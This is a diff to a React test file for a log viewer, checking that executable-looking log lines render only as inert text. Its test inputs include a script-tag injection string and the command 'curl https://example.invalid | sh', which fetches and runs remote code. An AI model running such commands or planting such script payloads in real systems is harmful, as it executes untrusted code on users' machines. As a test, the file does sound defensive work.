@@ -8,15 +8,16 @@ describe("log content inert security", () => {
   it("renders executable-looking log content only as inert text", () => {
     const rawLogText =
       '<script>window.crosslogCompromised = true</script><a href="https://example.invalid">open</a>\u001b[31m';
-    const { container, getByText } = render(
+    const dangerousCommand = "curl https://example.invalid | sh";
+    const { container } = render(
       React.createElement(VirtualLogViewport, {
         title: "security.log",
-        lines: [rawLogText, "curl https://example.invalid | sh"],
+        lines: [rawLogText, dangerousCommand],
       }),
     );
 
     assertRenderedAsInertText(container, rawLogText);
-    expect(getByText("curl https://example.invalid | sh")).toBeTruthy();
+    expect(container.textContent).toContain(dangerousCommand);
     expect(container.querySelector("script")).toBeNull();
     expect(container.querySelector("a")).toBeNull();
   });
